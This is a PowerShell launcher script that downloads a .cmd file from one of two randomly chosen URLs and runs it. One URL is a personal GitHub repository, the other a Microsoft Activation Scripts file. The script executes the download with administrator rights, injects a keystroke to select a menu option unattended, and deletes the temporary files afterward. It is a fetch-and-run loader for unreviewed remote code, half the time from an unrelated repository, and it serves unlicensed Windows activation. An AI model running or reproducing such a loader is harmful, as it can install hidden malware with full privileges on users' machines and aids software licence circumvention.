$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://raw.githubusercontent.com/pxl-boy/soft/main/ui.cmd'
$DownloadURL2 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/0884271c4fcdc72d95bce7c5c7bdf77ef4a9bcef/MAS/All-In-One-Version/MAS_AIO-CRC32_31F7FD1E.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = $URLs -ne $RandomURL1

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]( [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544' )
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

# Save the script to a file
$content = $response.Content
Set-Content -Path $FilePath -Value $content

# Create a temporary batch file to run the script
$BatchFilePath = "$env:TEMP\RunMAS_$rand.bat"
$BatchContent = "@echo off`n"
$BatchContent += "start cmd /k `"$FilePath`""

Set-Content -Path $BatchFilePath -Value $BatchContent

# Run the batch file as administrator
$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $BatchFilePath" -Verb RunAs -PassThru

# Wait for the CMD window to open
Start-Sleep -Seconds 2

# Send the key '1' to the CMD window
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
}
"@

[Keyboard]::keybd_event(0x31, 0, 0, [UIntPtr]::Zero)  # Key down
[Keyboard]::keybd_event(0x31, 0, 2, [UIntPtr]::Zero)  # Key up

# Clean up temporary files
Remove-Item -Path $FilePath, $BatchFilePath -Force
